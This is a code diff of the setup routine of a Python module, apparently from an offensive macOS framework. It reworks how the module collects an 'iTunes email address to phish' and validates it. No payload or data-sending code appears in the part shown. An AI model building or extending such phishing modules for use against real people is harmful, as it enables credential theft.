@@ -14,23 +14,18 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self) -> Tuple[bool, Optional[dict]]:
-        should_list = self._view.prompt("Would you like to list available iTunes accounts first? [Y/n]", [
-            ("The next prompt will ask you for an iTunes account (email).", "attention")
-        ]).lower()
+    def get_setup_messages(self) -> List[str]:
+        return [
+            "iTunes email address to phish: "
+        ]
 
-        if not should_list or should_list == "y":
-            return True, {
-                "list_accounts": True
-            }
+    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+        email = set_options[0]
+
+        if not email or "@" not in email:
+            self._view.display_error("Invalid email address.")
+            return False, None
         else:
-            email = self._view.prompt("iTunes email address to phish: ")
-
-            if not email or "@" not in email:
-                self._view.output("Invalid email address.", "attention")
-                return False, None
-            else:
-                return True, {
-                    "list_accounts": False,
-                    "email": email
-                }
+            return True, {
+                "email": email
+            }
